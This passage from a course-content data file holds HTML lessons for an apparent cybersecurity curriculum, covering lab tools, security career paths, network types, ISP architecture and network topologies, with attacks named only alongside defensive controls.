                  <div class="tool-row"><span>DVWA</span><span>Vulnerable web app</span><a href="https://dvwa.co.uk/" target="_blank" rel="noopener">Download</a></div>
                  <div class="tool-row"><span>Nmap</span><span>Network scanning</span><a href="https://nmap.org/" target="_blank" rel="noopener">Download</a></div>
                  <div class="tool-row"><span>Wireshark</span><span>Packet capture</span><a href="https://www.wireshark.org/" target="_blank" rel="noopener">Download</a></div>
                  <div class="tool-row"><span>Burp Suite Community</span><span>Web proxy</span><a href="https://portswigger.net/burp/communitydownload" target="_blank" rel="noopener">Download</a></div>
                  <div class="tool-row"><span>Metasploit Framework</span><span>Exploitation</span><a href="https://www.metasploit.com/" target="_blank" rel="noopener">Download</a></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Career Paths in Cybersecurity</h3>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">🛡️</span>
                    <h4>SOC Analyst</h4>
                    <span class="career-salary">PKR 80K–200K / month</span>
                  </div>
                  <p><strong>Role:</strong> Monitor, detect, and respond to security incidents in real time.</p>
                  <p><strong>Skills:</strong> Networking fundamentals, SIEM tools (Splunk, ELK, QRadar, Wazuh), log analysis, threat intelligence, IR basics.</p>
                  <p><strong>Certifications:</strong> CompTIA Security+, CompTIA CySA+, Splunk Core Certified User, Microsoft SC-200.</p>
                </div>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">⚔️</span>
                    <h4>Penetration Tester</h4>
                    <span class="career-salary">PKR 100K–300K / month</span>
                  </div>
                  <p><strong>Role:</strong> Simulate attacks to find vulnerabilities before real attackers do.</p>
                  <p><strong>Skills:</strong> Networking, Linux/Windows, web application security, Metasploit, Burp Suite, scripting (Python, Bash, PowerShell), social engineering.</p>
                  <p><strong>Certifications:</strong> OSCP, CEH, GPEN, eJPT.</p>
                </div>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">🚨</span>
                    <h4>Incident Responder</h4>
                    <span class="career-salary">PKR 120K–350K / month</span>
                  </div>
                  <p><strong>Role:</strong> Detect, contain, eradicate, and recover from security incidents.</p>
                  <p><strong>Skills:</strong> Digital forensics, malware analysis, network forensics, IR lifecycle, chain of custody.</p>
                  <p><strong>Certifications:</strong> GCIH, GCFA, ECIH, CompTIA CySA+.</p>
                </div>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">🔬</span>
                    <h4>Malware Analyst</h4>
                    <span class="career-salary">PKR 150K–400K / month</span>
                  </div>
                  <p><strong>Role:</strong> Analyze malicious software to understand its behavior and impact.</p>
                  <p><strong>Skills:</strong> Assembly, C/C++, Python, debuggers (x64dbg), disassemblers (IDA Pro, Ghidra), sandboxing.</p>
                  <p><strong>Certifications:</strong> GREM, GCFA, CMFAD.</p>
                </div>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">🏗️</span>
                    <h4>Security Engineer / Architect</h4>
                    <span class="career-salary">PKR 200K–500K / month</span>
                  </div>
                  <p><strong>Role:</strong> Design, build, and maintain secure systems and networks.</p>
                  <p><strong>Skills:</strong> Networking, firewalls, encryption, cloud security, IAM, Zero Trust.</p>
                  <p><strong>Certifications:</strong> CISSP, CISM, CCSP, AWS Security Specialty.</p>
                </div>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">📋</span>
                    <h4>Governance, Risk & Compliance (GRC)</h4>
                    <span class="career-salary">PKR 150K–400K / month</span>
                  </div>
                  <p><strong>Role:</strong> Ensure the organization meets legal, regulatory, and policy requirements.</p>
                  <p><strong>Skills:</strong> Risk management, compliance frameworks, policy writing, auditing, communication.</p>
                  <p><strong>Certifications:</strong> CISA, CISM, CRISC, ISO 27001 Lead Auditor.</p>
                </div>

                <div class="career-card">
                  <div class="career-head">
                    <span class="career-icon">💰</span>
                    <h4>Bug Bounty Hunter</h4>
                    <span class="career-salary">Variable — USD 100 to 10,000+ per bug</span>
                  </div>
                  <p><strong>Role:</strong> Independently find vulnerabilities in company systems and report them for rewards.</p>
                  <p><strong>Skills:</strong> Web security, mobile security, API security, automation, persistence.</p>
                  <p><strong>Platforms:</strong> <a href="https://www.hackerone.com/" target="_blank" rel="noopener">HackerOne</a>, <a href="https://www.bugcrowd.com/" target="_blank" rel="noopener">Bugcrowd</a>, <a href="https://www.yeswehack.com/" target="_blank" rel="noopener">YesWeHack</a>.</p>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>A safe, isolated lab is mandatory before any offensive practice.</li>
                  <li>Virtual machines with Host-Only networking provide the best isolation.</li>
                  <li>Kali Linux is the standard attacker VM; Metasploitable and DVWA are standard victims.</li>
                  <li>Snapshots allow you to experiment freely without fear.</li>
                  <li>Cybersecurity careers span SOC, Penetration Testing, Incident Response, Malware Analysis, Security Engineering, GRC, and Bug Bounty.</li>
                  <li>Each path has its own tools, skills, and certifications.</li>
                  <li>Start with fundamentals, then specialize.</li>
                  <li>Continuous learning is essential — threats evolve daily.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe — Guided lab environments</a>
                  <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box — CTF-style practice</a>
                  <a href="https://www.cybrary.it/" target="_blank" rel="noopener">Cybrary — Free cybersecurity courses</a>
                  <a href="https://www.nist.gov/nice" target="_blank" rel="noopener">NIST NICE Framework — Career taxonomy</a>
                  <a href="https://www.isc2.org/" target="_blank" rel="noopener">(ISC)² — CISSP certification body</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 1 — NETWORKING
      // ============================================================
      {
        id: "m1",
        type: "part",
        number: 1,
        title: "Networking Deep Foundations",
        icon: "🌐",
        blurb: "You cannot defend a network you do not understand. This module builds layer-by-layer knowledge of how data moves across the wire — and how each layer can be attacked or protected.",
        chapters: [
                    { id: "1.1", title: "What is a Network? — PAN, LAN, MAN, WAN & The Internet", pages: "31-42", read: 14,
            build: "Diagram a small office network with PAN, LAN, MAN, and WAN segments.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>A <strong>network</strong> is a collection of two or more computing devices connected through wired or wireless media to share resources, exchange data, and communicate using common protocols. From a Bluetooth earbud to the global Internet, every network exists to move information between endpoints.</p>
                <p>Networks are classified by <strong>geographic scope</strong>, <strong>ownership</strong>, and <strong>purpose</strong>. The five primary types are PAN, LAN, MAN, WAN, and the Internet itself — a network of networks.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Scenario</h3>
                <p>Look at a single household:</p>
                <ul class="content-list">
                  <li>A smartphone connects to wireless earbuds via Bluetooth — this is a <strong>PAN</strong>.</li>
                  <li>The same phone, a laptop, a smart TV, and a printer connect to the home Wi-Fi router — this is a <strong>LAN</strong>.</li>
                  <li>The router connects to an ISP, whose city-wide network links thousands of homes — this is a <strong>MAN</strong>.</li>
                  <li>The ISP connects to other ISPs and global backbone providers — this is a <strong>WAN</strong>.</li>
                  <li>Together, all of these form the <strong>Internet</strong>.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Core Network Components</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Component</span><span>Description</span><span>Examples</span>
                  </div>
                  <div class="tool-row"><span>Nodes</span><span>Devices that send or receive data</span><span>PCs, phones, servers</span></div>
                  <div class="tool-row"><span>Media</span><span>Physical or wireless path</span><span>Ethernet, fiber, Wi-Fi</span></div>
                  <div class="tool-row"><span>Protocols</span><span>Rules for communication</span><span>TCP, IP, HTTP, DNS</span></div>
                  <div class="tool-row"><span>Services</span><span>Functions provided</span><span>File sharing, email, web</span></div>
                  <div class="tool-row"><span>Intermediate Devices</span><span>Connect and direct traffic</span><span>Switches, routers, firewalls</span></div>
                  <div class="tool-row"><span>Network Interface</span><span>Hardware connecting node to medium</span><span>NIC, Wi-Fi chip</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Network Types in Depth</h3>

                              <section class="content-block">
                <h3 class="content-h">4. Network Types in Depth</h3>

                <figure class="content-figure">
                  <img src="./img/network-types.png" alt="PAN, LAN, MAN, WAN and Internet visualized as concentric scope rings" />
                  <figcaption>Figure 1.1 — The scope hierarchy of networks. Each ring represents a larger geographic footprint: PAN (personal), LAN (building), MAN (city), WAN (country), Internet (global).</figcaption>
                </figure>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">📱</span>
                    <h4>PAN — Personal Area Network</h4>
                  </div>
                  <p><strong>Definition:</strong> A network connecting devices within the immediate vicinity of an individual, typically 1–10 meters.</p>
                  <p><strong>Technologies:</strong> Bluetooth, NFC, Zigbee, Infrared, USB.</p>
                  <p><strong>Examples:</strong> Smartphone to wireless earbuds; smartwatch syncing with a phone; wireless keyboard and mouse.</p>
                  <p><strong>Characteristics:</strong> Very short range, low power, single-owner, limited devices.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Bluejacking — unsolicited Bluetooth messages</li>
                        <li>Bluesnarfing — unauthorized data access</li>
                        <li>Eavesdropping on Bluetooth traffic</li>
                        <li>NFC relay attacks</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Disable Bluetooth/NFC when unused</li>
                        <li>Use pairing authentication</li>
                        <li>Keep firmware updated</li>
                        <li>Avoid pairing in public spaces</li>
                        <li>Monitor unknown paired devices</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🏠</span>
                    <h4>LAN — Local Area Network</h4>
                  </div>
                  <p><strong>Definition:</strong> A network connecting devices within a limited area such as a home, office, school, or building.</p>
                  <p><strong>Technologies:</strong> Ethernet, Wi-Fi, switches, access points, routers.</p>
                  <p><strong>Examples:</strong> Home Wi-Fi network; school computer lab; corporate office network.</p>
                  <p><strong>Characteristics:</strong> High speed (100 Mbps–100 Gbps), low latency, private ownership, limited geographic scope, private IP addresses.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Unauthorized access to open Wi-Fi</li>
                        <li>ARP spoofing</li>
                        <li>MAC flooding</li>
                        <li>Rogue DHCP server</li>
                        <li>VLAN hopping</li>
                        <li>Lateral movement</li>
                        <li>Network sniffing</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>WPA3 or WPA2-Enterprise</li>
                        <li>802.1X port-based authentication</li>
                        <li>DHCP Snooping &amp; Dynamic ARP Inspection</li>
                        <li>Port Security on switches</li>
                        <li>VLAN segmentation</li>
                        <li>Network Access Control (NAC)</li>
                        <li>IDS/IPS monitoring</li>
                        <li>Encrypt sensitive traffic</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🏙️</span>
                    <h4>MAN — Metropolitan Area Network</h4>
                  </div>
                  <p><strong>Definition:</strong> A network spanning a city or large campus, connecting multiple LANs.</p>
                  <p><strong>Technologies:</strong> Metro Ethernet, Fiber Optic, Cable Internet, WiMAX, MPLS.</p>
                  <p><strong>Examples:</strong> City-wide cable TV network; municipal broadband; university campus across buildings; bank branch network within a city.</p>
                  <p><strong>Characteristics:</strong> Larger than LAN, smaller than WAN; usually single-entity owned; fiber backbones; connects multiple LANs.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Large attack surface across the city</li>
                        <li>Shared infrastructure risks</li>
                        <li>DDoS against city services</li>
                        <li>BGP hijacking</li>
                        <li>Physical tampering / fiber cuts</li>
                        <li>ISP-level traffic monitoring</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>VPN or MACsec encryption in transit</li>
                        <li>MPLS VPN segmentation</li>
                        <li>Redundant paths</li>
                        <li>Monitoring at aggregation points</li>
                        <li>Hardened routers and switches</li>
                        <li>Firewalls between segments</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🌍</span>
                    <h4>WAN — Wide Area Network</h4>
                  </div>
                  <p><strong>Definition:</strong> A network spanning a large geographic area such as a country, continent, or the globe.</p>
                  <p><strong>Technologies:</strong> Leased lines, MPLS, IPsec VPN, Satellite, undersea fiber, 4G/5G.</p>
                  <p><strong>Examples:</strong> Corporate network across countries; Internet backbone; military networks; airline reservation systems; cloud provider networks.</p>
                  <p><strong>Characteristics:</strong> Very large scope, multiple owners, higher cost, higher latency, public infrastructure, complex routing.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Data interception on long links</li>
                        <li>BGP hijacking</li>
                        <li>Nation-state surveillance</li>
                        <li>DDoS amplification</li>
                        <li>VPN exploitation</li>
                        <li>Route manipulation</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>IPsec or SSL VPNs</li>
                        <li>RPKI and route filtering</li>
                        <li>End-to-end encryption</li>
                        <li>Redundant paths and failover</li>
                        <li>Route table monitoring</li>
                        <li>Hardened edge routers</li>
                        <li>DDoS mitigation services</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🌐</span>
                    <h4>Internet — The Network of Networks</h4>
                  </div>
                  <p><strong>Definition:</strong> A global system of interconnected networks using the TCP/IP protocol suite.</p>
                  <p><strong>Technologies:</strong> TCP/IP, DNS, HTTP/HTTPS, BGP, IXPs, undersea cables, data centers.</p>
                  <p><strong>Examples:</strong> World Wide Web, email, cloud services, online banking, social media.</p>
                  <p><strong>Characteristics:</strong> Global scale, decentralized, public and private interconnects, standardized protocols, billions of devices.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Malware propagation via worms/botnets</li>
                        <li>Phishing at scale</li>
                        <li>DDoS from many sources</li>
                        <li>Web application breaches</li>
                        <li>Global ransomware campaigns</li>
                        <li>Supply chain compromise</li>
                        <li>DNS cache poisoning &amp; tunneling</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Firewalls and IPS</li>
                        <li>Timely patching</li>
                        <li>Email filtering &amp; anti-phishing</li>
                        <li>Multi-Factor Authentication</li>
                        <li>Encryption at rest and in transit</li>
                        <li>SIEM + threat intelligence</li>
                        <li>User awareness training</li>
                        <li>Zero Trust architecture</li>
                        <li>DNSSEC, DoH, DoT</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Comparison at a Glance</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Feature</span><span>PAN</span><span>LAN / MAN / WAN / Internet</span>
                  </div>
                  <div class="tool-row"><span>Range</span><span>1–10 m</span><span>Building → City → Country → Global</span></div>
                  <div class="tool-row"><span>Speed</span><span>Low–medium</span><span>High → High → Medium–high → Variable</span></div>
                  <div class="tool-row"><span>Ownership</span><span>Individual</span><span>Private → Private/Public → Multiple → Distributed</span></div>
                  <div class="tool-row"><span>Example</span><span>Bluetooth earbuds</span><span>Home Wi-Fi → City cable → Corporate branches → Web</span></div>
                  <div class="tool-row"><span>Security Risk</span><span>Low–medium</span><span>Medium–high → High → Very high → Extremely high</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>A network connects devices to share resources and communicate.</li>
                  <li>PAN, LAN, MAN, WAN, and the Internet differ by scope, ownership, and technology.</li>
                  <li>PAN is personal and short-range; LAN is local and high-speed; MAN spans a city; WAN spans countries; the Internet is global.</li>
                  <li>Every network type has unique security risks.</li>
                  <li>Defenders must layer controls: encryption, monitoring, segmentation, and user education.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/" target="_blank" rel="noopener">Bluetooth Security — Bluetooth SIG</a>
                  <a href="https://www.nfc-forum.org/" target="_blank" rel="noopener">NFC Forum</a>
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Packet Analysis</a>
                  <a href="https://www.netacad.com/courses/networking" target="_blank" rel="noopener">Cisco Networking Academy</a>
                  <a href="https://www.cloudflare.com/learning/" target="_blank" rel="noopener">Cloudflare Learning Center</a>
                </div>
              </section>
            ` },
                    { id: "1.2", title: "The Role of an ISP", pages: "43-48", read: 10,
            build: "Trace a request from your device to a public web server through your ISP.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>An <strong>Internet Service Provider (ISP)</strong> is a company or organization that provides individuals, businesses, and other organizations with access to the Internet. The ISP owns or leases infrastructure — fiber optic cables, routers, switches, wireless towers — to connect customers to the global Internet backbone.</p>
                <p>Beyond connectivity, an ISP typically provides IP address allocation, DNS resolution, email hosting, web hosting, and technical support. It acts as the <strong>gateway</strong> between a customer's local network and the worldwide Internet, routing packets using protocols like BGP (Border Gateway Protocol).</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Scenario</h3>
                <p>A home user subscribes to a fiber broadband plan. The ISP installs an <em>Optical Network Terminal (ONT)</em> and the user connects a Wi-Fi router to it. When the user opens a website, the request travels through five hops:</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Laptop → Home Wi-Fi router</div>
                  <div class="step-item"><span class="step-num">2</span> Router → ONT</div>
                  <div class="step-item"><span class="step-num">3</span> ONT → ISP fiber network → ISP core routers</div>
                  <div class="step-item"><span class="step-num">4</span> ISP routers use BGP to find the best path to the web server</div>
                  <div class="step-item"><span class="step-num">5</span> Request reaches the server; response follows the reverse path</div>
                </div>
                <p>The ISP assigns a public IP (often dynamic) to the user. In a corporate scenario, a business may use a dedicated leased line or MPLS connection to link multiple branch offices securely.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Types of ISPs</h3>

                <h4 class="sub-h">By Technology</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Type</span><span>Description</span><span>Example Tech</span>
                  </div>
                  <div class="tool-row"><span>Dial-up</span><span>Telephone lines, very slow, obsolete</span><span>PSTN</span></div>
                  <div class="tool-row"><span>DSL</span><span>Digital Subscriber Line</span><span>ADSL, VDSL</span></div>
                  <div class="tool-row"><span>Cable</span><span>Coaxial cable TV infrastructure</span><span>DOCSIS</span></div>
                  <div class="tool-row"><span>Fiber</span><span>Fiber optic, very high speed</span><span>FTTH, FTTB</span></div>
                  <div class="tool-row"><span>Wireless</span><span>Radio waves, fixed or mobile</span><span>Wi-Fi, WiMAX, 4G, 5G</span></div>
                  <div class="tool-row"><span>Satellite</span><span>Satellites, remote areas, high latency</span><span>Starlink, HughesNet</span></div>
                  <div class="tool-row"><span>Cellular</span><span>Mobile data via towers</span><span>3G, 4G, 5G</span></div>
                </div>

                <h4 class="sub-h">By Tier Level</h4>
                <ul class="content-list">
                  <li><strong>Tier 1 ISP</strong> — Owns a global backbone; peers with other Tier 1 without paying transit. Examples: AT&amp;T, Verizon, NTT, Deutsche Telekom, Lumen.</li>
                  <li><strong>Tier 2 ISP</strong> — Buys transit from Tier 1; peers with some networks. Regional or national ISPs.</li>
                  <li><strong>Tier 3 ISP</strong> — Buys transit from Tier 2; serves local areas. Most consumer ISPs.</li>
                </ul>

                <h4 class="sub-h">By Service Model</h4>
                <ul class="content-list">
                  <li><strong>Residential</strong> — Internet to homes.</li>
                  <li><strong>Business</strong> — Internet, MPLS, VPN, SLA-backed services.</li>
                  <li><strong>Hosting</strong> — Data center and hosting.</li>
                  <li><strong>Wholesale</strong> — Bandwidth to other ISPs.</li>
                  <li><strong>Mobile</strong> — Mobile data.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. How an ISP Works</h3>

                              <section class="content-block">
                <h3 class="content-h">4. How an ISP Works</h3>

                <figure class="content-figure">
                  <img src="./img/isp-architecture.png" alt="ISP architecture from customer premises through access, aggregation, core, IXP, and Tier 1 backbone" />
                  <figcaption>Figure 2.1 — The journey of a data packet through the ISP. From Last Mile to Transit, each layer plays a distinct role in delivering your request to the destination server.</figcaption>
                </figure>

                <h4 class="sub-h">Core Components</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Component</span><span>Function</span><span>Example</span>
                  </div>
                  <div class="tool-row"><span>CPE</span><span>Modem/router at customer site</span><span>ONT</span></div>
                  <div class="tool-row"><span>Access Network</span><span>Connects customer to ISP central office</span><span>DSLAM, CMTS, OLT</span></div>
                  <div class="tool-row"><span>Aggregation Network</span><span>Collects traffic from many customers</span><span>Agg switches</span></div>
                  <div class="tool-row"><span>Core Network</span><span>High-capacity routers/switches</span><span>Backbone</span></div>
                  <div class="tool-row"><span>Edge Routers</span><span>Connect to other ISPs and IXPs</span><span>Border routers</span></div>
                  <div class="tool-row"><span>DNS Servers</span><span>Resolve domain names to IPs</span><span>Recursive resolvers</span></div>
                  <div class="tool-row"><span>DHCP Servers</span><span>Assign IP addresses to customers</span><span>DHCP pool</span></div>
                  <div class="tool-row"><span>NOC</span><span>Monitoring, billing, support</span><span>24/7 ops</span></div>
                </div>

                <h4 class="sub-h">IP Address Allocation</h4>
                <p>ISPs receive IP blocks from Regional Internet Registries (RIRs):</p>
                <ul class="content-list">
                  <li><strong>AFRINIC</strong> — Africa</li>
                  <li><strong>APNIC</strong> — Asia-Pacific</li>
                  <li><strong>ARIN</strong> — North America</li>
                  <li><strong>LACNIC</strong> — Latin America and Caribbean</li>
                  <li><strong>RIPE NCC</strong> — Europe, Middle East, Central Asia</li>
                </ul>
                <p>Most residential customers receive a dynamic public IP via DHCP. Business customers may purchase a static public IP. Due to IPv4 exhaustion, many ISPs use <strong>Carrier-Grade NAT (CGNAT)</strong> to share a single public IP among many customers.</p>

                <h4 class="sub-h">DNS Resolution</h4>
                <p>ISPs typically provide DNS resolvers. When a user types a domain name, the ISP's DNS server resolves it to an IP address. Some ISPs offer DNS filtering. ISP DNS can be subject to censorship, logging, and attacks. Users may choose public DNS like Google (8.8.8.8), Cloudflare (1.1.1.1), or Quad9 (9.9.9.9).</p>

                <h4 class="sub-h">Peering and Transit</h4>
                <ul class="content-list">
                  <li><strong>Transit</strong> — An ISP pays a larger ISP to carry its traffic.</li>
                  <li><strong>Peering</strong> — Two ISPs exchange traffic without payment, usually at an Internet Exchange Point (IXP).</li>
                  <li><strong>IXP</strong> — Physical location where multiple ISPs connect. Examples: DE-CIX, AMS-IX, LINX.</li>
                </ul>

                <h4 class="sub-h">The Internet Backbone</h4>
                <p>The backbone consists of high-capacity fiber optic cables — including undersea cables connecting continents. Tier 1 ISPs own or lease these cables. Data travels using BGP routing.</p>

                <h4 class="sub-h">BGP — The Routing Protocol of the Internet</h4>
                <p>BGP exchanges routing information between autonomous systems (AS). Each ISP has an Autonomous System Number (ASN). BGP determines the best path for data. It is based on <strong>trust</strong> — misconfigurations or malicious announcements can cause outages or traffic redirection.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors Involving ISPs</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attack Techniques</span>
                    <ul>
                      <li><strong>ISP-Level Surveillance</strong> — metadata and unencrypted content monitoring</li>
                      <li><strong>BGP Hijacking</strong> — announcing IP prefixes you don't own (e.g., Pakistan Telecom YouTube, 2008)</li>
                      <li><strong>DNS Spoofing/Poisoning</strong> — redirecting users to malicious sites via compromised resolver</li>
                      <li><strong>CGNAT Abuse</strong> — hiding behind shared IPs to bypass blocks or obscure attribution</li>
                      <li><strong>Rogue ISP / DHCP</strong> — fake network config leading to MITM</li>
                      <li><strong>DDoS on ISP Core</strong> — targeting DNS, core, or edge routers</li>
                      <li><strong>Lawful Interception Abuse</strong> — insecure lawful-intercept interfaces</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>BGP Security</strong> — RPKI, route filtering, prefix limits, MANRS</li>
                      <li><strong>Secure DNS</strong> — DNSSEC, DoH, DoT, rate limiting</li>
                      <li><strong>Router Hardening</strong> — strong auth, ACLs, control plane policing</li>
                      <li><strong>Traffic Monitoring</strong> — NetFlow, sFlow, DDoS detection</li>
                      <li><strong>Responsible CGNAT</strong> — logging, port allocation</li>
                      <li><strong>Regular Audits</strong> — pen tests, staff awareness</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Customer-Side Security</h3>
                <p>Even if you trust your ISP, protecting your own traffic is your responsibility:</p>
                <ul class="content-list takeaways">
                  <li>Use HTTPS everywhere; enable HSTS.</li>
                  <li>Use a trusted VPN to encrypt traffic from your ISP.</li>
                  <li>Use encrypted DNS (DoH/DoT) to prevent snooping.</li>
                  <li>Check for BGP hijacks using <a href="https://bgpstream.com/" target="_blank" rel="noopener">BGPStream</a> or <a href="https://stat.ripe.net/" target="_blank" rel="noopener">RIPE Stat</a>.</li>
                  <li>Use a static IP for business-critical services.</li>
                  <li>Understand your ISP's privacy policy and data retention.</li>
                  <li>Report abuse directly to your ISP.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Tools and Resources</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Tool / Resource</span><span>Purpose</span><span>Link</span>
                  </div>
                  <div class="tool-row"><span>APNIC</span><span>Asia-Pacific IP registry</span><a href="https://www.apnic.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>ARIN</span><span>North America IP registry</span><a href="https://www.arin.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>RIPE NCC</span><span>Europe / Middle East / Central Asia</span><a href="https://www.ripe.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>AFRINIC</span><span>Africa</span><a href="https://www.afrinic.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>LACNIC</span><span>Latin America</span><a href="https://www.lacnic.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>ICANN</span><span>Global Internet coordination</span><a href="https://www.icann.org/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>MANRS</span><span>Routing security</span><a href="https://www.manrs.org/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>RPKI</span><span>Resource Public Key Infrastructure</span><a href="https://www.rpki.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>BGPStream</span><span>BGP hijack detection</span><a href="https://bgpstream.com/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>RIPE Stat</span><span>BGP and routing data</span><a href="https://stat.ripe.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>BGPMon</span><span>BGP monitoring</span><a href="https://bgpmon.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>Cloudflare Radar</span><span>Internet traffic and attacks</span><a href="https://radar.cloudflare.com/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>Hurricane Electric BGP Toolkit</span><span>BGP looking glass</span><a href="https://bgp.he.net/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>Shodan</span><span>Internet-connected device search</span><a href="https://www.shodan.io/" target="_blank" rel="noopener">Visit</a></div>
                  <div class="tool-row"><span>Censys</span><span>Internet-wide scanning</span><a href="https://censys.io/" target="_blank" rel="noopener">Visit</a></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>An ISP connects customers to the Internet and manages IP allocation, DNS, and routing.</li>
                  <li>ISPs are classified by technology, tier, and service model.</li>
                  <li>Tier 1 ISPs own global backbones; Tier 2 and 3 buy transit.</li>
                  <li>BGP is the routing protocol that glues the Internet together.</li>
                  <li>ISPs can monitor traffic — encryption (HTTPS, VPN, DoH) protects privacy.</li>
                  <li>BGP hijacking, DNS spoofing, and CGNAT abuse are major threats.</li>
                  <li>Defenses include RPKI, MANRS, DNSSEC, monitoring, and customer education.</li>
                </ul>
              </section>
            ` },
                    { id: "1.3", title: "Network Topologies", pages: "49-58", read: 14,
            build: "Draw star, ring, mesh, and hybrid topologies with security ratings.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Network topology</strong> refers to the physical or logical arrangement of devices, nodes, and communication links in a computer network. It defines how devices are interconnected, how data flows between them, and how the network is structured for performance, scalability, fault tolerance, and security.</p>
                <p><strong>Physical topology</strong> is the actual physical layout of cables, devices, and connections. <strong>Logical topology</strong> is the way data flows through the network, regardless of physical layout. Understanding topology is critical for network design, troubleshooting, performance optimization, and security architecture.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Scenario</h3>
                <p>In a small office, all computers connect to a central switch using Ethernet cables — that is a <strong>star topology</strong> physically. But when the switch forwards broadcast traffic to all ports, it behaves like a <strong>bus topology</strong> logically.</p>
                <p>In a data center, servers connect to multiple switches and routers in a <strong>mesh topology</strong> so that if one link fails, traffic reroutes automatically. In a home network, devices connect wirelessly to a single router — again a <strong>star</strong> with the router at the center.</p>
